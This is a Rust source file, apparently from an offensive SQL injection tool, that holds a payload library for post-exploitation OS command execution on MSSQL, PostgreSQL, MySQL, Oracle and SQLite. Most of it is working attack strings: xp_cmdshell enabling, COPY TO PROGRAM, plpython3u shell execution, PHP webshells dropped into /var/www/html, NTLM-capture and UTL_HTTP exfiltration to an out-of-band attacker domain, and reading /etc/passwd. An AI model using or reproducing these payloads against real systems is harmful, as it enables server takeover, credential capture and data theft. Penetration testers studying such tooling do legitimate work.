//! OS command execution payloads via SQL injection (post-exploitation).

use serde::{Deserialize, Serialize};

/// Result of an OS command execution attempt via SQL injection
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct OsExecResult {
    pub output: Option<String>,
    pub payload_used: String,
    pub dbms: String,
    pub technique: String,
    pub total_requests: usize,
}

/// A single OS-execution payload
#[derive(Debug, Clone)]
pub struct OsExecPayload {
    pub payload: String,
    pub description: &'static str,
    pub dbms: &'static str,
    pub required_privilege: &'static str,
    pub returns_output: bool,
}

/// Database of OS-command-execution payloads, grouped by DBMS.
pub struct OsCommandPayloads;

impl OsCommandPayloads {
    /// Generate a random temp file path to avoid TOCTOU and fingerprinting.
    fn random_temp_file() -> String {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let chars: String = (0..12)
            .map(|_| rng.sample(rand::distributions::Alphanumeric) as char)
            .collect();
        format!("/tmp/sqx_out_{}", chars)
    }

    /// Escape SQL string literals by doubling single quotes.
    /// ' → '' (standard SQL escaping)
    fn escape_sql_string(s: &str) -> String {
        s.replace('\'', "''")
    }

    /// Generate payloads for executing `cmd` on the target OS.
    /// The cmd parameter is SQL-escaped to prevent injection.
    pub fn all_payloads(cmd: &str) -> Vec<OsExecPayload> {
        // Escape the command to prevent SQL injection
        let cmd_escaped = Self::escape_sql_string(cmd);
        // Generate random temp file for PostgreSQL payloads to avoid TOCTOU
        let pg_temp_file = Self::random_temp_file();
        vec![
            // ── MSSQL ──────────────────────────────────────────────────────────────
            OsExecPayload {
                payload: format!("'; EXEC xp_cmdshell '{}'-- ", cmd_escaped),
                description: "MSSQL xp_cmdshell direct",
                dbms: "MSSQL",
                required_privilege: "sysadmin",
                returns_output: true,
            },
            OsExecPayload {
                payload: format!(
                    "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; \
                     EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; \
                     EXEC xp_cmdshell '{}'-- ",
                    cmd_escaped
                ),
                description: "MSSQL enable xp_cmdshell then exec",
                dbms: "MSSQL",
                required_privilege: "sysadmin",
                returns_output: true,
            },
            OsExecPayload {
                payload: format!(
                    "'; CREATE TABLE #o(r NVARCHAR(MAX)); \
                     INSERT #o EXEC xp_cmdshell '{}'; \
                     SELECT CAST((SELECT TOP 1 r FROM #o) AS INT)-- ",
                    cmd_escaped
                ),
                description: "MSSQL xp_cmdshell via cast error exfil",
                dbms: "MSSQL",
                required_privilege: "sysadmin",
                returns_output: true,
            },
            OsExecPayload {
                payload: format!(
                    "'; DECLARE @r NVARCHAR(MAX); SET @r=N'{}'; EXEC master..xp_cmdshell @r-- ",
                    cmd_escaped
                ),
                description: "MSSQL xp_cmdshell via variable",
                dbms: "MSSQL",
                required_privilege: "sysadmin",
                returns_output: true,
            },
            OsExecPayload {
                payload: format!(
                    "'; DECLARE @obj INT, @ret INT; \
                     EXEC sp_oacreate 'wscript.shell', @obj OUTPUT; \
                     EXEC sp_oamethod @obj, 'run', @ret OUTPUT, '{}'-- ",
                    cmd_escaped
                ),
                description: "MSSQL OLE Automation wscript.shell",
                dbms: "MSSQL",
                required_privilege: "sysadmin / OLE Automation enabled",
                returns_output: false,
            },
            OsExecPayload {
                payload: "'; EXEC xp_dirtree '\\\\{{OOB_DOMAIN}}\\share'-- ".to_string(),
                description: "MSSQL xp_dirtree UNC NTLM capture (requires --oob-domain)",
                dbms: "MSSQL",
                required_privilege: "public",
                returns_output: false,
            },
            OsExecPayload {
                payload: "'; EXEC xp_fileexist '\\\\{{OOB_DOMAIN}}\\share\\x'-- ".to_string(),
                description: "MSSQL xp_fileexist UNC NTLM capture (requires --oob-domain)",
                dbms: "MSSQL",
                required_privilege: "public",
                returns_output: false,
            },
            OsExecPayload {
                payload: format!(
                    "'; EXEC sp_executesql N'EXEC master..xp_cmdshell N\\'{}\\''-- ",
                    cmd
                ),
                description: "MSSQL sp_executesql wrapping xp_cmdshell",
                dbms: "MSSQL",
                required_privilege: "sysadmin",
                returns_output: true,
            },
            // ── PostgreSQL ─────────────────────────────────────────────────────────
            OsExecPayload {
                payload: format!("'; COPY (SELECT '') TO PROGRAM '{}'-- ", cmd_escaped),
                description: "PostgreSQL COPY TO PROGRAM",
                dbms: "PostgreSQL",
                required_privilege: "SUPERUSER",
                returns_output: false,
            },
            OsExecPayload {
                payload: format!(
                    "'; COPY (SELECT '') TO PROGRAM '{} > {1}'; \
                     CREATE TEMP TABLE _o(l TEXT); \
                     COPY _o FROM '{1}'; SELECT * FROM _o-- ",
                    cmd_escaped, pg_temp_file
                ),
                description: "PostgreSQL COPY TO PROGRAM + read back (random temp file)",
                dbms: "PostgreSQL",
                required_privilege: "SUPERUSER",
                returns_output: true,
            },
            OsExecPayload {
                payload: format!("' UNION SELECT (SELECT pg_read_file('{}')),NULL-- ", pg_temp_file),
                description: "PostgreSQL read command output via pg_read_file (random temp file)",
                dbms: "PostgreSQL",
                required_privilege: "pg_read_server_files",
                returns_output: true,
            },
            OsExecPayload {
                payload: format!(
                    "'; CREATE EXTENSION IF NOT EXISTS plpython3u; \
                     CREATE OR REPLACE FUNCTION _sqx_exec() RETURNS TEXT AS \
                     $$ import subprocess; return subprocess.check_output('{}',shell=True,text=True) $$ \
                     LANGUAGE plpython3u; SELECT _sqx_exec()-- ",
                    cmd_escaped
                ),
                description: "PostgreSQL plpython3u exec",
                dbms: "PostgreSQL",
                required_privilege: "SUPERUSER + plpython3u installed",
                returns_output: true,
            },
            OsExecPayload {
                payload: format!(
                    "'; SELECT lo_export(lo_from_bytea(0,'{}'::bytea),'/tmp/_sqx.sh'); \
                     COPY (SELECT '') TO PROGRAM 'bash /tmp/_sqx.sh'-- ",
                    cmd_escaped
                ),
                description: "PostgreSQL lo_export + COPY TO PROGRAM",
                dbms: "PostgreSQL",
                required_privilege: "SUPERUSER",
                returns_output: false,
            },
            // ── MySQL ──────────────────────────────────────────────────────────────
            OsExecPayload {
                payload: "' UNION SELECT '<?php system($_GET[\"c\"]);?>',NULL \
                          INTO OUTFILE '/var/www/html/sqx_shell.php'-- ".to_string(),
                description: "MySQL INTO OUTFILE webshell drop",
                dbms: "MySQL",
                required_privilege: "FILE",
                returns_output: false,
            },
            OsExecPayload {
                payload: "' UNION SELECT '<?php passthru($_GET[\"c\"]);?>',NULL \
                          INTO OUTFILE '/var/www/html/sqxp.php'-- ".to_string(),
                description: "MySQL INTO OUTFILE passthru webshell",
                dbms: "MySQL",
                required_privilege: "FILE",
                returns_output: false,
            },
            OsExecPayload {
                payload: "' UNION SELECT 0x3c3f70687020706173737468727528245f4745545b2263225d293b3f3e,NULL \
                          INTO DUMPFILE '/var/www/html/sqxd.php'-- ".to_string(),
                description: "MySQL INTO DUMPFILE hex-encoded webshell",
                dbms: "MySQL",
                required_privilege: "FILE",
                returns_output: false,
            },
            OsExecPayload {
                payload: format!("'; SELECT sys_exec('{}')-- ", cmd_escaped),
                description: "MySQL sys_exec UDF (requires raptor/lib_mysqludf_sys)",
                dbms: "MySQL",
                required_privilege: "FILE + plugin dir write",
                returns_output: false,
            },
            OsExecPayload {
                payload: format!("'; SELECT sys_eval('{}')-- ", cmd_escaped),
                description: "MySQL sys_eval UDF (returns output)",
                dbms: "MySQL",
                required_privilege: "FILE + plugin dir write",
                returns_output: true,
            },
            // ── Oracle ─────────────────────────────────────────────────────────────
            OsExecPayload {
                payload: format!(
                    "'; EXEC DBMS_SCHEDULER.CREATE_JOB(\
                     job_name=>'SQX_JOB',job_type=>'EXECUTABLE',\
                     job_action=>'{}',enabled=>TRUE,auto_drop=>TRUE)-- ",
                    cmd_escaped
                ),
                description: "Oracle DBMS_SCHEDULER CREATE_JOB",
                dbms: "Oracle",
                required_privilege: "CREATE JOB",
                returns_output: false,
            },
            OsExecPayload {
                payload: format!(
                    "'; EXEC DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper {} /tmp/out')-- ",
                    cmd_escaped
                ),
                description: "Oracle DBMS_JAVA.RUNJAVA Wrapper",
                dbms: "Oracle",
                required_privilege: "JAVA_ADMIN",
                returns_output: false,
            },
            OsExecPayload {
                payload: format!(
                    "'; DECLARE rc NUMBER; \
                     BEGIN rc:=DBMS_PIPE.PACK_MESSAGE('{} > /tmp/sqx_out'); \
                     rc:=DBMS_PIPE.SEND_MESSAGE('sqx'); END;-- ",
                    cmd_escaped
                ),
                description: "Oracle DBMS_PIPE command pipe",
                dbms: "Oracle",
                required_privilege: "EXECUTE on DBMS_PIPE",
                returns_output: false,
            },
            OsExecPayload {
                payload: format!(
                    "'; DECLARE r VARCHAR2(1000); \
                     BEGIN r:=UTL_HTTP.REQUEST('http://{{OOB_DOMAIN}}/'||{}); END;-- ",
                    cmd
                ),
                description: "Oracle UTL_HTTP OOB exfil (requires --oob-domain)",
                dbms: "Oracle",
                required_privilege: "EXECUTE on UTL_HTTP",
                returns_output: false,
            },
            OsExecPayload {
                payload: "'; CREATE OR REPLACE DIRECTORY sqx_dir AS '/etc'; \
                          CREATE TABLE sqx_ext(l VARCHAR2(4000)) \
                          ORGANIZATION EXTERNAL (TYPE oracle_loader DEFAULT DIRECTORY sqx_dir \
                          ACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINE) LOCATION ('passwd')); \
                          SELECT * FROM sqx_ext-- ".to_string(),
                description: "Oracle EXTERNAL TABLE file read",
                dbms: "Oracle",
                required_privilege: "CREATE ANY DIRECTORY + CREATE TABLE",
                returns_output: true,
            },
            // ── SQLite ─────────────────────────────────────────────────────────────
            OsExecPayload {
                payload: "'; SELECT load_extension('/tmp/shell.so','sqlite3_shell_init')-- ".to_string(),
                description: "SQLite load_extension shell",
                dbms: "SQLite",
                required_privilege: "load_extension enabled",
                returns_output: true,
            },
            OsExecPayload {
                payload: "' UNION SELECT writefile('/var/www/html/sqx.php', \
                          X'3c3f70687020706173737468727528245f4745545b2263225d293b3f3e')-- ".to_string(),
                description: "SQLite writefile webshell (sqlean/fileio)",
                dbms: "SQLite",
                required_privilege: "fileio extension loaded",
                returns_output: false,
            },
        ]
    }

    /// Quick check: does the DBMS support OS execution at all?
    pub fn supports_os_exec(dbms: &str) -> bool {
        matches!(dbms, "MySQL" | "PostgreSQL" | "MSSQL" | "Oracle" | "SQLite")
    }
}
